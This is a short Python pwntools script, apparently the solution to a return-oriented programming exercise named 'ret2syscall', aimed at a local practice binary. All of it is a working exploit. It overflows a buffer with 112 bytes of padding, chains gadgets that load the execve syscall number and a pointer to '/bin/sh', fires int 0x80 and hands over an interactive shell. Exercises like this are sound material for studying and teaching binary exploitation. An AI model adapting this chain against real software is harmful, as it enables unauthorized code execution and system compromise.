from pwn import *

io = process("../ex1-rop/ret2syscall")
int_80 = 0x08049421
pop_eax = 0x080bb196
pop_edx_ecx_ebx = 0x0806eb90
bin_sh = 0x080be408
payload = flat([b'a'*112, pop_eax, 0xb, pop_edx_ecx_ebx, 0, 0, bin_sh, int_80])
io.recvline()
io.sendline(payload)
io.interactive()
